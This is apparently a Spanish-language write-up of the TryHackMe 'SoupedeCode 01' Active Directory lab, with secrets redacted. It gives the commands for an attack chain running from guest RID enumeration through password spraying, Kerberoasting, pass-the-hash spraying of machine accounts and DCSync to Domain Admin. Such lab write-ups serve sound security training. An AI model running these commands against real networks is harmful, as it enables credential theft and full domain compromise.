# SoupedeCode 01 (TryHackMe) — de null a Domain Admin

> **Writeup sanitizado.** Credenciales, hashes y flags van redactados (`<redacted>`). Es un recorrido de **metodología y lecciones**, no un walkthrough que trivialice la sala.

**Tipo:** Active Directory standalone · Windows Server 2022 · DC `DC01` · dominio `SOUPEDECODE.LOCAL`
**Resumen de la cadena:**
`guest RID-brute → password spray (pass=username) → Kerberoast → share backup → PtH-spray de cuentas de máquina → FileServer$ admin del DC → DA`

---

## 1. Recon
DC clásico con **445 abierto** (SMB disponible — a diferencia de otras cajas AD donde toca ir por Kerberos). Shares no estándar visibles: **`backup`** y **`Users`** (ACCESS_DENIED al leer → objetivo para cuando haya credenciales).

## 2. Enumeración de usuarios — guest, no null
```bash
nxc smb $ip -u '' -p '' --rid-brute        # null -> ACCESS_DENIED (sin SAMR)
nxc smb $ip -u 'guest' -p '' --rid-brute 4000   # guest -> lista completa (~960 usuarios)
```
> **Lección — null ≠ guest.** El null no daba SAMR; la cuenta **guest** sí. Limpieza: `grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1`.

## 3. Password spray (pass = username)
AS-REP roast sobre la lista = **seco** (ningún usuario sin preauth). Con ~960 usuarios, el movimiento es un **spray `password = username`**:
```bash
grep -v '\$' users > users_h    # fuera cuentas de máquina
nxc smb $ip -u users_h -p users_h --no-bruteforce --continue-on-success | grep '\[+\]'
# -> <user>:<user>
```
> **Lección — `--no-bruteforce`** empareja usuario↔contraseña **línea a línea** (en vez de producto cartesiano). Con el mismo fichero en `-u` y `-p` prueba cada nombre como su propia contraseña, **1 intento por cuenta = seguro contra lockout**.

## 4. Re-enum autenticado → Kerberoast
La primera cuenta es low-priv (solo lee su propia carpeta en el share `Users` → **user flag**; `backup` sigue denegado). Pero con credencial válida se desbloquea el **Kerberoast**:
```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/<user>:<pass> -dc-ip $ip -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt    # crackea una cuenta de servicio
```
> **Lección — los nombres son el mapa.** Entre las cuentas de servicio hay una cuyo rol apunta directamente al share `backup`. La enumeración cuenta una historia; léela.

## 5. Share `backup` → dump de hashes de máquina
La cuenta de servicio crackeada **sí** puede leer el share `backup` → un `backup_extract.txt` con un **dump de hashes NT de cuentas de MÁQUINA** (`...$`, RID 2xxx).

> ⚠️ **Lección — las cuentas de máquina NO se crackean.** Su contraseña es aleatoria de ~120 caracteres. Un hash NT no se crackea para usarlo: se usa **tal cual con Pass-the-Hash**. (Error a evitar: lanzarles hashcat.)

## 6. PtH-spray → FileServer$ admin del DC → Domain Admin
```bash
awk -F: '{print $1}' backup_extract.txt > m_users
awk -F: '{print $4}' backup_extract.txt > m_hashes
nxc smb   $ip -u m_users -H m_hashes --no-bruteforce --continue-on-success
nxc winrm $ip -u m_users -H m_hashes --no-bruteforce --continue-on-success
# -> una de las cuentas de máquina sale (Pwn3d!)
```
Esa cuenta de máquina es **admin local del DC** → Domain Admin de facto:
```bash
evil-winrm -i $ip -u '<HOST>$' -H <redacted>     # -> root flag
# (alternativa) DCSync del Administrator:
impacket-secretsdump -hashes :<redacted> "SOUPEDECODE.LOCAL/<HOST>\$@$ip"
```

---

## Lecciones transversales
1. **445 abierto → enum SMB disponible**; y **null ≠ guest** (el RID-brute lo dio guest).
2. **Userlist gigante + AS-REP seco → spray `pass=username`** con `--no-bruteforce` (1 intento/cuenta, sin lockout).
3. **Cred nueva = re-enumerar TODO autenticado.** Kerberoast solo *después* de tener una credencial.
4. **Los nombres de cuentas/shares son inteligencia** (una service account apunta al share `backup`).
5. **Cuentas de máquina del dump → no crackear, PtH-spray.** Una máquina `(Pwn3d!)` en el DC = admin local = **Domain Admin de facto**.
